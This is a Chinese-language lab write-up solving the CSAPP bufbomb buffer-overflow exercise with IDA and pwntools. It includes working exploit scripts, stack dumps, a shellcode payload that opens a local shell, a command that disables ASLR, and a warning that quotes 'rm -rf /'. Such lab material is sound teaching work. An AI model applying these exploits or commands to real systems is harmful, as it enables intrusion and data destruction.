\u66f4\u65b0\uff1a\u4f60\u53ef\u4ee5\u7528\u5f88\u591a\u79cd\u65b9\u5f0f\u6765\u505a\u8fd9\u4e2a\u5b9e\u9a8c\u3002\u6211\u518d\u5e9f\u8bdd\u51e0\u53e5\u597d\u4e86\u3002 \u73b0\u5728\u5b9e\u9a8c\u662f\u7ed9\u51fa\u4e86\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5b83\u7684\u51fd\u6570\u8c03\u7528\u5b58\u5728\u6f0f\u6d1e\uff0c\u4f60\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u7834\u574f\u6808\u4e0a\u7684\u6570\u636e\u6765\uff0c\u4f8b\u5982\u4f7f\u51fd\u6570\u8fd4\u56de\u5230\u4f60\u6240\u6307\u5b9a\u7684\u51fd\u6570\u4e0a\uff0c\u751a\u81f3\u662f\u83b7\u5f97\u76ee\u6807\u4e3b\u673a\u7684\u8bbf\u95ee\u6216\u662f\u63a7\u5236\u6743\uff08getshell\uff09\u3002\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u6211\u8fd8\u662f\u5efa\u8bae\u67e5\u770b \u8fd9\u91cc \u3002 smoke() \u4e0d\u7ba1\u4e0a\u9762\u600e\u4e48\u8bf4\uff0c\u53cd\u6b63\u6211\u53ea\u8bb0\u4f4f\u4e86\u8981\u6c42\u3002\u5148run\u4e00\u4e0b\u770b\u770b\uff1a \u8981\u6c42\u5fc5\u987b\u6307\u5b9a\u4e00\u4e2a\u961f\u4f0d\u540d\u79f0\u3002\u6307\u5b9a\u4e00\u4e2a\u8bd5\u8bd5\uff0c\u7136\u540e\u968f\u610f\u8f93\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\uff1a \u5927\u6982\u4e86\u89e3\u4e86\u3002\u628abufbomb\u62d6\u5230IDA\u91cc\uff0c\u5f00\u59cb\u8c03\u8bd5\u3002 \u8ddf\u968f\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u8fdb\u5165 launch() \uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 int __usercall launch @ < eax > ( int a1 @ < eax > , int a2 @ < edx > ) { int v2 ; // ebx void * v3 ; // esp int result ; // eax char v5 ; // [esp+1Bh] [ebp-3Dh] int savedregs ; // [esp+58h] [ebp+0h] v2 = a1 ; v3 = alloca ( a2 + ((( unsigned __int16 ) & savedregs - 72 ) & 0x3FF8 ) + 15 ); memset (( void * )(( unsigned int ) & v5 & 0xFFFFFFF0 ), 244 , a2 + ((( unsigned __int16 ) & savedregs - 72 ) & 0x3FF8 )); if ( ! quiet ) { if ( hexformat ) printf ( \"Type Hex string:\" ); else printf ( \"Type string:\" ); } if ( v2 ) { testn (); result = success ; if ( success ) return result ; LABEL_8 : result = puts ( \"Better luck next time\" ); success = 0 ; return result ; } test (); result = success ; if ( ! success ) goto LABEL_8 ; return result ; } \u968f\u540e\u8df3\u8fdb\u4e86 test() \uff1a C 1 2 3 4 5 6 7 8 9 10 int test () { signed int v0 ; // edx v0 = getbuf (); if ( v0 != cookie ) return printf ( \"Dud: getbuf returned 0x%x \\n \" , v0 ); printf ( \"Boom!: getbuf returned 0x%x \\n \" , v0 ); return validate ( 3 ); } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 .text: 08048 DA0 ; =============== S U B R O U T I N E ======================================= .text: 08048 DA0 .text: 08048 DA0 ; Attributes: bp-based frame .text: 08048 DA0 .text: 08048 DA0 public test .text: 08048 DA0 test proc near ; CODE XREF: launch:loc_8049080\u2193p .text: 08048 DA0 .text: 08048 DA0 var_4 = dword ptr - 4 .text: 08048 DA0 .text: 08048 DA0 push ebp .text: 08048 DA1 mov ebp , esp .text: 08048 DA3 sub esp , 18 h .text: 08048 DA6 mov [ ebp + var_4 ], 0 DEADBEEFh .text: 08048 DAD call getbuf .text: 08048 DB2 mov edx , eax .text: 08048 DB4 mov eax , [ ebp + var_4 ] .text: 08048 DB7 cmp eax , 0 DEADBEEFh .text: 08048 DBC jz short loc_8048DD0 .text: 08048 DBE mov dword ptr [ esp ], offset aSabotagedTheSt ; \"Sabotaged!: the stack has been corrupte\"... .text: 08048 DC5 call _puts .text: 08048 DCA leave .text: 08048 DCB retn .text: 08048 DCB ; --------------------------------------------------------------------------- .text: 08048 DCC align 10 h .text: 08048 DD0 .text: 08048 DD0 loc_8048DD0 : ; CODE XREF: test+1C\u2191j .text: 08048 DD0 cmp edx , ds : cookie .text: 08048 DD6 jz short loc_8048DF0 .text: 08048 DD8 mov [ esp + 4 ], edx .text: 08048 DDC mov dword ptr [ esp ], offset aDudGetbufRetur ; \"Dud: getbuf returned 0x%x\\n\" .text: 08048 DE3 call _printf .text: 08048 DE8 leave .text: 08048 DE9 retn .text: 08048 DE9 ; --------------------------------------------------------------------------- .text: 08048 DEA align 10 h .text: 08048 DF0 .text: 08048 DF0 loc_8048DF0 : ; CODE XREF: test+36\u2191j .text: 08048 DF0 mov [ esp + 4 ], edx .text: 08048 DF4 mov dword ptr [ esp ], offset aBoomGetbufRetu ; \"Boom!: getbuf returned 0x%x\\n\" .text: 08048 DFB call _printf .text: 08048 E00 mov dword ptr [ esp ], 3 .text: 08048 E07 call validate .text: 08048 E0C leave .text: 08048 E0D retn .text: 08048 E0D test endp .text: 08048 E0D .text: 08048 E0D ; --------------------------------------------------------------------------- .text: 08048 E0E align 10 h \u518d\u8fdb\u5165 getbuf() \uff1a 1 2 3 4 5 6 7 signed int getbuf () { char v1 ; // [esp+10h] [ebp-18h] Gets ( & v1 ); return 1 ; } \u597d\u4e86\uff0c\u91cd\u70b9\u6765\u4e86\u3002\u5148\u6765\u770b\u770b\u6808\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 FFFAF240 F7FB9FC0 ld_2 .29 . so : __libc_enable_secure + CC FFFAF244 08048448 LOAD : byte_8048448 FFFAF248 00000000 FFFAF24C 9 C117200 FFFAF250 00000000 FFFAF254 F7D8C430 libc_2 .29 . so : __evoke_link_warning_getwd + B3F0 FFFAF258 00000000 FFFAF25C 00000000 FFFAF260 08 BBD580 [ heap ] : 08 BBD580 FFFAF264 FFFFFFFF FFFAF268 FFFAF288 [ stack ] : FFFAF288 FFFAF26C 08048 DB2 test + 12 Tip What is the x86 \u201cret\u201d instruction equivalent to? \u5f53\u524d v1 \u7684\u5730\u5740\u662f 0xFFFAF250 \uff0c\u6240\u4ee5\u9700\u8981\u4e00\u8def\u8986\u76d6\u5230 0xFFFAF268 \uff0c\u4e00\u51714\u00d77=28\u4e2a char \uff0c\u7136\u540e\u5c06 smoke() \u7684\u5730\u5740 0x08048EB0 \u7ed9\u5230\u8fd4\u56de\u5730\u5740 0xFFFAF26C \u4e0a\u5c31\u53ef\u4ee5\u4e86\u3002\u4e8e\u662f\u6709exp.py\uff1a Tip \u6ce8\u610f\uff0c\u8fd9\u91cc\u4f7f\u7528\u7684\u5de5\u5177\u662f pwntools \uff0c\u8fd9\u53ef\u4ee5\u5927\u5e45\u63d0\u9ad8\u4f60\u7684\u6548\u7387\u3002\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f60\u53ef\u4ee5\u67e5\u770b \u6587\u6863 \u3002\u5728Linux\u7cfb\u7edf\u4e0a\u8fdb\u884c\u5b89\u88c5\u662f\u6bd4\u8f83\u7b80\u5355\u7684\uff0c\u53ea\u9700\u8981\u53c2\u8003\u6587\u6863\u4e2d\u7684\u51e0\u53e5\u547d\u4ee4\u5373\u53ef\u3002\u53e6\u5916\uff0c\u5bf9\u4e8eWindows\u7cfb\u7edf\uff0c\u4f60\u53ef\u4ee5\u5229\u7528WSL\u6765\u4f7f\u7528\u5b83\u3002\u4f60\u53ef\u4ee5\u53c2\u8003\u6211\u8fc7\u5f80\u7684\u6587\u7ae0\u6765\u8fdb\u884c\u5b89\u88c5\uff0c\u53ef\u4ee5\u5728\u5de6\u4fa7\u680f\u6216\u662f\u4e0a\u65b9\u641c\u7d22\u6846\u4e2d\u627e\u5230\u3002 1 2 3 4 5 6 7 8 from pwn import * p = process ( argv = [ '/home/domain/Documents/SZU/CSAPP/4/bufbomb' , '-t' , 'domain' ]) print ( p . recv ()) address = 0x08048EB0 payload = 'a' * 28 + p32 ( address ) p . sendline ( payload ) print ( p . recv ()) \u53ef\u4ee5\u5f97\u5230\u7ed3\u679c\uff1a 1 2 3 4 5 6 7 8 9 10 11 / home / domain / IdeaProjects / pwntools / venv / bin / python / home / domain / IdeaProjects / pwntools / main . py [ x ] Starting local process ' /home/domain/Documents/SZU/CSAPP/4/bufbomb ' [ + ] Starting local process ' /home/domain/Documents/SZU/CSAPP/4/bufbomb ' : pid 21751 Team : domain Cookie : 0 x6dfd74c3 Type string : Smoke ! : You called smoke () [ * ] Stopped process ' /home/domain/Documents/SZU/CSAPP/4/bufbomb ' ( pid 21751 ) Process finished with exit code 0 \u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u8f93\u51fa\u4e86\u8c03\u7528\u4e86 smoke() \u7684\u4fe1\u606f\uff0c\u518d\u770b\u770b smoke() \u51fd\u6570\uff1a 1 2 3 4 5 6 void __noreturn smoke () { puts ( \"Smoke!: You called smoke()\" ); validate ( 0 ); exit ( 0 ); } \u5e94\u8be5\u5df2\u7ecf\u6210\u529f\u3002 Tip \u6211\u77e5\u9053\u603b\u662f\u4f1a\u6709\u4eba\u95ee\u6211\u4e0d\u60f3\u7528pwntools\u600e\u4e48\u529e\u3002\u5bf9\u4e8e\u8fd9\u4e00\u9898\u6765\u8bf4\uff0c\u4f60\u53ef\u4ee5\u51c6\u5907\u597dpayload\uff0c\u5c31\u50cf\u8fd9\u6837\uff1a \u7136\u540e\uff0c\u8fd9\u6837\u5b50\uff1a 1 cat . / payload | . / sendstring | . / bufbomb - t domain \u5c31\u53ef\u4ee5\u5f97\u5230\uff1a \u53ef\u4ee5\u770b\u5230\uff0c\u6210\u529f\u5730\u8c03\u7528\u4e86 smoke() \u3002 \u53e6\u5916\uff0c\u63a5\u4e0b\u6765\u6211\u662f\u4e0d\u4f1a\u7ee7\u7eed\u8bb2\u4e0d\u7528pwntools\u600e\u4e48\u529e\u7684\u3002 fizz() \u8fd9\u56de\u9700\u8981\u8c03\u7528\u4e00\u4e2a\u51fd\u6570\u5e76\u4e14\u4f20\u5165\u53c2\u6570\u3002\u6839\u636e\u8981\u6c42\u6211\u4eec\u5148\u6765 makecookie \uff1a \u597d\uff0c\u5148\u7559\u4e0bdomain\u7684Cookie\uff1a 1 0 x6dfd74c3 \u5907\u7528\u3002\u6765\u770b\u770b fizz() \uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 11 12 13 void __cdecl __noreturn fizz ( int a1 ) { if ( a1 == cookie ) { printf ( \"Fizz!: You called fizz(0x%x) \\n \" , a1 ); validate ( 1 ); } else { printf ( \"Misfire: You called fizz(0x%x) \\n \" , a1 ); } exit ( 0 ); } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 .text: 08048 E60 ; =============== S U B R O U T I N E ======================================= .text: 08048 E60 .text: 08048 E60 ; Attributes: noreturn bp-based frame .text: 08048 E60 .text: 08048 E60 public fizz .text: 08048 E60 fizz proc near .text: 08048 E60 .text: 08048 E60 arg_0 = dword ptr 8 .text: 08048 E60 .text: 08048 E60 push ebp .text: 08048 E61 mov ebp , esp .text: 08048 E63 sub esp , 8 .text: 08048 E66 mov eax , [ ebp + 8 ] .text: 08048 E69 cmp eax , ds : cookie .text: 08048 E6F jz short loc_8048E90 .text: 08048 E71 mov [ esp + 4 ], eax .text: 08048 E75 mov dword ptr [ esp ], offset aMisfireYouCall ; \"Misfire: You called fizz(0x%x)\\n\" .text: 08048 E7C call _printf .text: 08048 E81 .text: 08048 E81 loc_8048E81 : ; CODE XREF: fizz+4C\u2193j .text: 08048 E81 mov dword ptr [ esp ], 0 ; status .text: 08048 E88 call _exit .text: 08048 E88 ; --------------------------------------------------------------------------- .text: 08048 E8D align 10 h .text: 08048 E90 .text: 08048 E90 loc_8048E90 : ; CODE XREF: fizz+F\u2191j .text: 08048 E90 mov [ esp + 4 ], eax .text: 08048 E94 mov dword ptr [ esp ], offset aFizzYouCalledF ; \"Fizz!: You called fizz(0x%x)\\n\" .text: 08048 E9B call _printf .text: 08048 EA0 mov dword ptr [ esp ], 1 .text: 08048 EA7 call validate .text: 08048 EAC jmp short loc_8048E81 .text: 08048 EAC fizz endp .text: 08048 EAC .text: 08048 EAC ; --------------------------------------------------------------------------- .text: 08048 EAE align 10 h \u9700\u8981\u4e00\u4e2a\u53c2\u6570\uff0c\u6240\u4ee5\u53ef\u4ee5\u6709exp.py\uff1a 1 2 3 4 5 6 7 8 from pwn import * p = process ( argv = [ '/home/domain/Documents/SZU/CSAPP/4/bufbomb' , '-t' , 'domain' ]) print ( p . recv ()) address = 0x08048E60 payload = 'a' * 28 + p32 ( address ) + p32 ( 0x00000000 ) + p32 ( 0x6dfd74c3 ) p . sendline ( payload ) print ( p . recv ()) \u53ef\u4ee5\u5f53\u4f5c\u5c31\u662f\u5728\u4e0a\u6b21\u7684\u57fa\u7840\u4e0a\u6539\u4e86\u4e2a\u51fd\u6570\u5730\u5740 fizz \uff08 0x08048E60 \uff09\uff0c\u5916\u52a0\u628a\u53c2\u6570\u653e\u4e0a\u53bb\u3002\u4f60\u53ef\u80fd\u60f3\u77e5\u9053\u4e3a\u4ec0\u4e48\u662f\u8fd9\u6837\uff0c\u4e5f\u53ef\u80fd\u60f3\u77e5\u9053\u90a3\u4e2a\u5947\u602a\u76840\u586b\u5145\u662f\u4ec0\u4e48\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u9002\u5f53\u5730\u5728\u4e0a\u9762\u7684\u811a\u672c\u52a0 pause() \uff0c\u7136\u540e\u7528IDA Attach to process... \uff0c\u9009\u4e2d bufbomb \u5c31\u53ef\u4ee5\u5f00\u59cb\u8c03\u8bd5\u8fd9\u4e2a\u8fdb\u7a0b\u4e86\u3002 Warning \u8c03\u8bd5\u662f\u5f88\u91cd\u8981\u7684\u3002\u8981\u662f\u8ba9\u6211\u53ea\u770b\u4ee3\u7801\u4e0d\u8c03\u8bd5\uff0c\u6211\u53ef\u80fd\u51e0\u4e4e\u5199\u4e0d\u51fapayload\u3002\u800c\u4e14\uff0c\u5f53\u4f60\u7684\u8f93\u5165\u5e76\u6ca1\u6709\u5f97\u5230\u9884\u671f\u7684\u7ed3\u679c\u65f6\uff0c\u5982\u679c\u4f60\u4e0d\u8fdb\u884c\u8c03\u8bd5\u662f\u5f88\u96be\u53d1\u73b0\u95ee\u9898\u6240\u5728\u7684\u3002\u5173\u4e8e\u5982\u4f55\u8fdb\u884c\u8c03\u8bd5\uff0c\u4f60\u5f88\u5feb\u5c31\u4f1a\u5728\u5de6\u4fa7\u680f\u6216\u662f\u4e0a\u65b9\u641c\u7d22\u6846\u4e2d\u627e\u5230\u76f8\u5173\u6587\u7ae0\uff08\u6216\u8bb8\u5427\uff09\u3002 \u770b\u770b\u8fd9\u6b21\u7684\u6808\uff1a 1 2 3 4 5 6 7 8 9 10 11 FFEC7250 61616161 FFEC7254 61616161 FFEC7258 61616161 FFEC725C 61616161 FFEC7260 61616161 FFEC7264 61616161 FFEC7268 61616161 FFEC726C 61616161 FFEC7270 00000000 FFEC7274 6 DFD74C3 FFEC7278 FFEC7200 [ stack ] : FFEC7200 \u6b64\u65f6\u6267\u884c\u5230 0x08048E66 \uff1a 1 2 3 4 5 6 .text: 08048 E60 push ebp .text: 08048 E61 mov ebp , esp .text: 08048 E63 sub esp , 8 .text: 08048 E66 mov eax , [ ebp + 8 ] .text: 08048 E69 cmp eax , ds : cookie .text: 08048 E6F jz short loc_8048E90 \u8fd9\u4e2a\u65f6\u5019 EBP \u662f 0xFFEC726C \uff0c\u51fd\u6570 fizz() \u53c2\u6570\u5c06\u4ece 0xFFEC7274 \u4e0a\u53d6\u503c\uff0c\u6211\u4eec\u5df2\u7ecf\u5c06Cookie\u8986\u76d6\u4e0a\u53bb\u4e86\uff0c\u6240\u4ee5\u6ca1\u6709\u95ee\u9898\uff1a 1 2 3 4 5 6 7 8 9 10 11 / home / domain / IdeaProjects / pwntools / venv / bin / python / home / domain / IdeaProjects / pwntools / main . py [ x ] Starting local process ' /home/domain/Documents/SZU/CSAPP/4/bufbomb ' [ + ] Starting local process ' /home/domain/Documents/SZU/CSAPP/4/bufbomb ' : pid 16217 Team : domain Cookie : 0 x6dfd74c3 Type string : Fizz ! : You called fizz ( 0 x6dfd74c3 ) [ * ] Stopped process ' /home/domain/Documents/SZU/CSAPP/4/bufbomb ' ( pid 16217 ) Process finished with exit code 0 \u4f60\u8981\u662f\u8fd8\u5728\u7ea0\u7ed3\u90a3\u4e2a32\u4f4d\u76840\u586b\u5145\u662f\u5565\u53ef\u4ee5\u627e\u4e2a\u6b63\u5e38\u7684\u51fd\u6570\u8fb9\u8c03\u8fb9\u770b\u770b\u6808\u5c31\u77e5\u9053\u5566\uff0c\u8fd9\u548c\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a\u76f8\u5173\u3002\u53e6\u5916\uff0c\u770b\u4e86\u4e0b\u9762\u8fd9\u5173\u6216\u8bb8\u4f60\u4e5f\u5c31\u77e5\u9053\u4e86\u3002 bang() \u8fd9\u56de\u662f\u8981\u5148\u6539\u53d8\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf global_value \u7684\u503c\uff0c\u7136\u540e\u518d\u8df3\u8f6c\u5230 bang() \u51fd\u6570\u3002\u4e3a\u4e86\u6539\u53d8\u5168\u5c40\u53d8\u91cf\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528 Gets() \u5e76\u5c06\u8be5\u5168\u5c40\u53d8\u91cf\u5730\u5740\u4f20\u5165\uff0c\u6765\u5bf9\u5176\u8fdb\u884c\u4fee\u6539\uff0c\u7136\u540e\u518d\u8df3\u8f6c\u5230 bang() \u4e0a\u5c31\u5b8c\u6210\u4e86\u3002 \u53e6\u5916\uff0c\u7531\u4e8e\u8fd9\u4e2a\u7a0b\u5e8f\u5e76\u6ca1\u6709\u7981\u6b62\u6808\u4e0a\u6267\u884c\uff0c\u6240\u4ee5\u4f60\u60f3\u5f80\u7f13\u51b2\u533a\u91cc\u5199\u70b9\u6c47\u7f16\u597d\u50cf\u4e5f\u6ca1\u95ee\u9898\u3002\u4f46\u662f\uff0c\u6211\u662f\u4e0d\u4f1a\u8fd9\u6837\u5e72\u7684\u3002 \u968f\u7740 NX \u4fdd\u62a4\u7684\u5f00\u542f\uff0c\u4ee5\u5f80\u76f4\u63a5\u5411\u6808\u6216\u8005\u5806\u4e0a\u76f4\u63a5\u6ce8\u5165\u4ee3\u7801\u7684\u65b9\u5f0f\u96be\u4ee5\u7ee7\u7eed\u53d1\u6325\u6548\u679c\u3002\u653b\u51fb\u8005\u4eec\u4e5f\u63d0\u51fa\u6765\u76f8\u5e94\u7684\u65b9\u6cd5\u6765\u7ed5\u8fc7\u4fdd\u62a4\uff0c\u76ee\u524d\u4e3b\u8981\u7684\u662f ROP(Return Oriented Programming)\uff0c\u5176\u4e3b\u8981\u601d\u60f3\u662f\u5728 \u6808\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u57fa\u7840\u4e0a\uff0c\u5229\u7528\u7a0b\u5e8f\u4e2d\u5df2\u6709\u7684\u5c0f\u7247\u6bb5 (gadgets) \u6765\u6539\u53d8\u67d0\u4e9b\u5bc4\u5b58\u5668\u6216\u8005\u53d8\u91cf\u7684\u503c\uff0c\u4ece\u800c\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b \u3002\u6240\u8c13 gadgets \u5c31\u662f\u4ee5 ret \u7ed3\u5c3e\u7684\u6307\u4ee4\u5e8f\u5217\uff0c\u901a\u8fc7\u8fd9\u4e9b\u6307\u4ee4\u5e8f\u5217\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e9b\u5730\u5740\u7684\u5185\u5bb9\uff0c\u65b9\u4fbf\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002 \u9996\u5148\u627e\u4e00\u4e0b global_value \u7684\u5730\u5740\uff1a 1 2 .bss: 0804 A1C4 public global_value .bss: 0804 A1C4 global_value dd ? ; DATA XREF: bang+6\u2191r \u8bb0\u4e0b\u5730\u5740\uff1a 1 0 x0804A1C4 \u7b2c\u4e00\u6b65\u8df3\u8f6c\u5230 Gets() \uff08 0x080489C0 \uff09\u9700\u8981\u7ed9\u8fd9\u4e2a\u53c2\u6570\u3002\u770b\u8d77\u6765\u548c\u7b2c\u4e8c\u5173\u5f88\u50cf\uff0c\u662f\u4e0d\u662f\uff1f\u968f\u540e\u5c31\u9700\u8981\u8f93\u5165\u503c\u5230 global_value \u4e2d\u4e86\uff1a 1 2 cookie = 0x6dfd74c3 p . sendline ( p32 ( cookie )) \u522b\u5fd8\u4e86\u6700\u540e\u8fd8\u8981\u8df3\u8f6c\u5230 bang() \uff08 0x08048E10 \uff09\u5f53\u4e2d\uff0c\u6240\u4ee5\u5c31\u6709exp.py\uff1a 1 2 3 4 5 6 7 8 9 10 from pwn import * p = process ( argv = [ '/home/domain/Documents/SZU/CSAPP/4/bufbomb' , '-t' , 'domain' ]) print ( p . recv ()) address = 0x080489C0 payload = 'a' * 28 + p32 ( address ) + p32 ( 0x08048E10 ) + p32 ( 0x0804A1C4 ) p . sendline ( payload ) cookie = 0x6dfd74c3 p . sendline ( p32 ( cookie )) print ( p . recv ()) \u53ef\u4ee5\u5f97\u5230\uff1a 1 2 3 4 5 6 7 8 9 10 11 / home / domain / IdeaProjects / pwntools / venv / bin / python / home / domain / IdeaProjects / pwntools / main . py [ x ] Starting local process ' /home/domain/Documents/SZU/CSAPP/4/bufbomb ' [ + ] Starting local process ' /home/domain/Documents/SZU/CSAPP/4/bufbomb ' : pid 11026 Team : domain Cookie : 0 x6dfd74c3 Type string : Bang ! : You set global_value to 0 x6dfd74c3 [ * ] Stopped process ' /home/domain/Documents/SZU/CSAPP/4/bufbomb ' ( pid 11026 ) Process finished with exit code 0 \u770b\u6765\u6ca1\u6709\u95ee\u9898\uff0c\u6211\u4eec\u6765attach\u4e0a\u53bb\u8ddf\u7740\u770b\u770b\u8fd0\u884c\u5f97\u600e\u4e48\u6837\uff1a 1 2 3 FF8DF26C 080489 C0 Gets FF8DF270 08048 E10 bang FF8DF274 0804 A1C4 . bss : global_value \u8fd9\u662f\u7a0b\u5e8f\u9996\u6b21\u8c03\u7528 Gets() \u540e\u7684\u6808\uff0c\u5b83\u5373\u5c06\u4ece getbuf() \u4e2d\u8fd4\u56de\u5230 Gets() \u4e0a\uff0c\u5e76\u4ee5 global_value \u7684\u5730\u5740\u4e3a\u53c2\u6570\u3002\u968f\u540e\uff0c\u7b2c\u4e8c\u6b21 Gets() \u6267\u884c\u540e\uff0c\u5b83\u5c06\u8fd4\u56de\u5230 0x08048E10 \u4e0a\uff0c\u5373 bang() \u3002\u8fd9\u4e2a\u65f6\u5019\u7684\u6808\u662f\u8fd9\u6837\u7684\uff1a 1 2 3 FF8DF26C 61616161 FF8DF270 08048 E10 bang FF8DF274 0804 A1C4 . bss : global_value \u5b83\u5373\u5c06\u8fd4\u56de\u5230 bang() \u51fd\u6570\u4e0a\u3002\u5e76\u4e14\u6b64\u65f6\u4e5f\u53ef\u4ee5\u770b\u5230 global_value \u5df2\u7ecf\u88ab\u6539\u53d8\uff1a 1 0804 A1C0 04 00 00 00 C3 74 FD 6 D 00 00 00 00 00 00 00 00 ....... m ........ \u7ee7\u7eed\u8ddf\u5230 bang() \u51fd\u6570\u91cc\uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 11 12 13 void __noreturn bang () { if ( global_value == cookie ) { printf ( \"Bang!: You set global_value to 0x%x \\n \" , global_value ); validate ( 2 ); } else { printf ( \"Misfire: global_value = 0x%x \\n \" , global_value ); } exit ( 0 ); } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 .text: 08048 E10 ; =============== S U B R O U T I N E ======================================= .text: 08048 E10 .text: 08048 E10 ; Attributes: noreturn bp-based frame .text: 08048 E10 .text: 08048 E10 public bang .text: 08048 E10 bang proc near .text: 08048 E10 push ebp .text: 08048 E11 mov ebp , esp .text: 08048 E13 sub esp , 8 .text: 08048 E16 mov eax , ds : global_value .text: 08048 E1B cmp eax , ds : cookie .text: 08048 E21 jz short loc_8048E40 .text: 08048 E23 mov [ esp + 4 ], eax .text: 08048 E27 mov dword ptr [ esp ], offset aMisfireGlobalV ; \"Misfire: global_value = 0x%x\\n\" .text: 08048 E2E call _printf .text: 08048 E33 .text: 08048 E33 loc_8048E33 : ; CODE XREF: bang+4C\u2193j .text: 08048 E33 mov dword ptr [ esp ], 0 ; status .text: 08048 E3A call _exit .text: 08048 E3A ; --------------------------------------------------------------------------- .text: 08048 E3F align 10 h .text: 08048 E40 .text: 08048 E40 loc_8048E40 : ; CODE XREF: bang+11\u2191j .text: 08048 E40 mov [ esp + 4 ], eax .text: 08048 E44 mov dword ptr [ esp ], offset aBangYouSetGlob ; \"Bang!: You set global_value to 0x%x\\n\" .text: 08048 E4B call _printf .text: 08048 E50 mov dword ptr [ esp ], 2 .text: 08048 E57 call validate .text: 08048 E5C jmp short loc_8048E33 .text: 08048 E5C bang endp \u6ca1\u6709\u95ee\u9898\u3002\u5b8c\u7ed3\u6492\u82b1\u3002 Tip \u597d\u5427\u6211\u8fd8\u662f\uff0c\u518d\u8bf4\u51e0\u53e5\u5173\u4e8e\u4e0d\u7528pwntools\u7684\u60c5\u51b5\u3002\u7531\u4e8e\u6709\u4e24\u6b21\u8f93\u5165\uff0c\u4f3c\u4e4e\u53ea\u8c03\u7528\u4e00\u6b21 sendstring \u6ca1\u6cd5\u641e\u5b9apayload\u3002\u4e8e\u662f\u5c31\u4e0d\u5f97\u4e0d\u8fd9\u6837\uff1a 1 2 3 . / sendstring < . / payload > . / converted echo \"c374fd6d\" | . / sendstring >> . / converted . / bufbomb - t domain < . / converted \u7b2c\u4e8c\u884c\u5c31\u662f\u628a\u7b2c\u4e8c\u6b21\u8981\u8f93\u5165\u7ed9\u5168\u5c40\u53d8\u91cf\u7684Cookie\u585e\u5230\u8f6c\u6362\u540e\u7684payload\u6587\u4ef6\u91cc\u3002 \u6216\u8bb8\u4f60\u6709\u66f4\u597d\u7684\u529e\u6cd5\uff0c\u603b\u4e4b\u80fd\u641e\u5b9a\u5c31\u884c\u3002\u4e0d\u8fc7\u6211\u8fd8\u662f\u63a8\u8350\u7528pwntools\u3002 Nitro mode \u5176\u5b9e\u6211\u4eec\u7684\u5b9e\u9a8c\u6ca1\u8981\u6c42\u8fd9\u4e2a\uff0c\u6211\u8fd8\u6ca1\u7a7a\u53bb\u770b\u8fd9\u662f\u5e72\u561b\u7684\uff0c\u6628\u665a\u5728\u5927\u4f6c\u7684\u6307\u5bfc\u4e0b\u641e\u4e86\u8fd9\u4e2agetshell\uff1a 1 2 3 4 5 6 7 8 from pwn import * p = process ( argv = [ '/home/domain/Documents/SZU/CSAPP/4/bufbomb' , '-n' , '-t' , 'domain' ]) print ( p . recv ()) payload = asm ( shellcraft . sh ()) + 'a' * ( 0x20c - 44 ) + p32 ( 0xFFFFB060 ) p . sendline ( payload ) p . interactive () print ( p . recv ()) \u8fd9\u4e2a...\u7531\u4e8e\u6ca1\u6709\u5173\u6808\u4e0a\u6267\u884c\uff0c\u6240\u4ee5\u5982\u679c\u5173\u95ed\u4e86\u5730\u5740\u968f\u673a\uff1a 1 echo 0 > /proc/sys/kernel/randomize_va_space \u5c31\u53ef\u4ee5\uff1a 1 2 3 4 5 6 7 8 9 / home / domain / IdeaProjects / pwntools / venv / bin / python / home / domain / IdeaProjects / pwntools / main . py [ x ] Starting local process '/home/domain/Documents/SZU/CSAPP/4/bufbomb' [ + ] Starting local process '/home/domain/Documents/SZU/CSAPP/4/bufbomb' : pid 14786 Team : domain [ * ] Switching to interactive mode Cookie : 0x6dfd74c3 ls main . py pwntools . iml venv \u6210\u529f\u5f97\u5230\u4e3b\u673a\u7684shell\u3002\u5565\uff1f\u4f60\u8bf4\u4e0d\u77e5\u9053\u6211\u5728\u5e72\u561b\uff1f\u8fd8\u4e0d\u77e5\u9053\u8fd9\u80fd\u5e72\u561b\uff1f\u4f60\u53ef\u4ee5\u6572\u4e00\u6761\u4f60\u77e5\u9053\u7684Linux\u547d\u4ee4\u8bd5\u8bd5\u3002 Danger \u4f60\u5df2\u7ecf\u5f97\u5230\u4e86\u76ee\u6807\u4e3b\u673a\u7684shell\uff0c\u8bf7\u4e0d\u8981\u5728\u771f\u673a\u4e0a\u6216\u662f\u6ca1\u6709\u6253\u5feb\u7167\u7684\u865a\u62df\u673a\u4e0a\u8fd0\u884c\u7c7b\u4f3c rm -rf / \u7684\u547d\u4ee4\uff01\u8fd9\u5728\u6ca1\u6709 --no-preserve-root \u53c2\u6570\u4e4b\u7c7b\u7684\u7cfb\u7edf\u4e0a\u5c06\u9020\u6210\u4e25\u91cd\u95ee\u9898\u3002 \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u8003\uff1a \u57fa\u672c ROP - ret2shellcode 